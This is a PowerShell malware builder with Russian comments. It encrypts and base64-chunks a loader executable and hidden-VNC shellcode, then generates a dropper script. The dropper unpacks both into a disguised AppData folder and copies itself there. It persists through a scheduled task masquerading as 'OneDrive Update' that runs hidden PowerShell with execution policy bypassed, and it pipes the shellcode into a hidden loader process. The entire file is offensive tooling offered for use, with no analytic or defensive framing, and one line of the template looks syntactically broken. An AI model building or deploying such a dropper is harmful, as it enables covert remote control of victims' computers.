param(
    [Parameter(Mandatory = $true)] [string] $LoaderPath,     
    [Parameter(Mandatory = $true)] [string] $ShellcodePath,  
    [Parameter(Mandatory = $true)] [string] $OutPs1         
)

$passphrase = "S3cr3tP@ssw0rd!"  
$pbkdf2Iter = 10000
$saltSize = 16
$ivSize   = 16

function New-RandomBytes($length) {
    $bytes = New-Object byte[] $length
    [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($bytes)
    return $bytes
}

function Derive-Keys($pass, $salt) {
    $kdf = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($pass, $salt, $pbkdf2Iter)
    $aesKey  = $kdf.GetBytes(32)  # AES-256
    $hmacKey = $kdf.GetBytes(32)  # HMAC-SHA256
    return @{ AES = $aesKey; HMAC = $hmacKey }
}

function Encrypt-Data($plainBytes) {
    $salt = New-RandomBytes $saltSize
    $iv   = New-RandomBytes $ivSize
    $keys = Derive-Keys $passphrase $salt
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = 'CBC'
    $aes.Padding = 'PKCS7'
    $aes.Key   = $keys.AES
    $aes.IV    = $iv
    $enc = $aes.CreateEncryptor()
    $ct = $enc.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
    $aes.Dispose()

    # HMAC-SHA256 по (IV || ciphertext)
    $hmac = [System.Security.Cryptography.HMACSHA256]::new($keys.HMAC)
    $hmacData = $iv + $ct
    $tag = $hmac.ComputeHash($hmacData)
    $hmac.Dispose()

    # [salt||IV||ciphertext||HMAC]
    return $salt + $iv + $ct + $tag
}

function To-Chunks {
    param([byte[]]$bytes, [int]$chunkSize = 1000)
    $b64 = [Convert]::ToBase64String($bytes)
    $list = @()
    for ($i = 0; $i -lt $b64.Length; $i += $chunkSize) {
        $len = [Math]::Min($chunkSize, $b64.Length - $i)
        $list += $b64.Substring($i, $len)
    }
    return $list
}

if (-not (Test-Path $LoaderPath))    { throw "loader not found: $LoaderPath" }
if (-not (Test-Path $ShellcodePath)) { throw "shellcode not found: $ShellcodePath" }
$loaderBytes    = [IO.File]::ReadAllBytes($LoaderPath)
$shellBytes     = [IO.File]::ReadAllBytes($ShellcodePath)
$encLoader  = Encrypt-Data $loaderBytes
$encShell   = Encrypt-Data $shellBytes
$loaderChunks = To-Chunks -bytes $encLoader
$shellChunks  = To-Chunks -bytes $encShell
$startTemplate = @"
param()
`$passphrase = '$passphrase'
`$pbkdf2Iter = $pbkdf2Iter
`$saltSize   = $saltSize
`$ivSize     = $ivSize

function Reassemble([string[]]`$chunks){
    [Convert]::FromBase64String((`$chunks -join ''))
}

function Derive-Keys(`$pass, `$salt) {
    `$kdf = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(`$pass, `$salt, `$pbkdf2Iter)
    return @{
        AES  = `$kdf.GetBytes(32)
        HMAC = `$kdf.GetBytes(32)
    }
}

function Decrypt-Data([byte[]]`$blob) {
    `$salt = `$blob[0..(`$saltSize-1)]
    `$iv   = `$blob[`$saltSize..(`$saltSize + `$ivSize -1)]
    `$tagStart = `$saltSize + `$ivSize + 0
    `$tagLen   = 32
    `$ctStart  = `$saltSize + `$ivSize
    `$ctLen    = `$blob.Length - `$tagStart - `$tagLen

    `$ct  = `$blob[`$ctStart..(`$ctStart + `$ctLen -1)]
    `$tag = `$blob[(`$blob.Length - `$tagLen)..(`$blob.Length -1)]
    `$keys = Derive-Keys `$passphrase `$salt

    `$hmac = [System.Security.Cryptography.HMACSHA256]::new(`$keys.HMAC)
    `$computed = `$hmac.ComputeHash(`$iv + `$ct)
    `$hmac.Dispose()
    if (-not (`,`,$computed).SequenceEqual(`$,`,`$tag)) {
        throw 'HMAC validation failed'
    }

    `$aes = [System.Security.Cryptography.Aes]::Create()
    `$aes.Mode    = 'CBC'
    `$aes.Padding = 'PKCS7'
    `$aes.Key     = `$keys.AES
    `$aes.IV      = `$iv
    `$dec = `$aes.CreateDecryptor()
    `$plain = `$dec.TransformFinalBlock(`$ct, 0, `$ct.Length)
    `$aes.Dispose()
    return `$plain
}

`$loaderChunks = @(
$(($loaderChunks | ForEach-Object { "    '$_'," }) -join "`n")
)

`$shellChunks = @(
$(($shellChunks  | ForEach-Object { "    '$_'," }) -join "`n")
)

`$home = Join-Path `$env:LOCALAPPDATA 'Win32Components'
if (-not (Test-Path `$home)) { New-Item -Path `$home -ItemType Directory -Force | Out-Null }

`$ldrPath = Join-Path `$home 'ldr.exe'
if (-not (Test-Path `$ldrPath)) {
    `$enc = Reassemble `$loaderChunks
    `$dec = Decrypt-Data `$enc
    [IO.File]::WriteAllBytes(`$ldrPath, `$dec)
}

`$scPath = Join-Path `$home 'hvnc.bin'
`$encSc = Reassemble `$shellChunks
`$decSc = Decrypt-Data `$encSc
[IO.File]::WriteAllBytes(`$scPath, `$decSc)

`$me   = `$MyInvocation.MyCommand.Path
`$dest = Join-Path `$home 'sync.ps1'
if (`$me -ne `$dest) {
    Copy-Item -Path `$me -Destination `$dest -Force
}
`$taskName = 'OneDrive Update'
if (-not (Get-ScheduledTask -TaskName `$taskName -ErrorAction SilentlyContinue)) {
    `$action = New-ScheduledTaskAction -Execute 'powershell.exe' `
        -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$dest`""
    `$trigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName `$taskName -Action `$action -Trigger `$trigger -Force
}

`$proc = Start-Process -FilePath `$ldrPath -WindowStyle Hidden -NoNewWindow `
    -RedirectStandardInput Pipe -PassThru

try {
    `$stream = `$proc.StandardInput.BaseStream
    `$stream.Write(`$decSc,0,`$decSc.Length)
    `$stream.Close()
} catch {
    # ignore
}

exit
"@

Set-Content -LiteralPath $OutPs1 -Value $startTemplate -Encoding ASCII
Write-Host "Go $OutPs1"
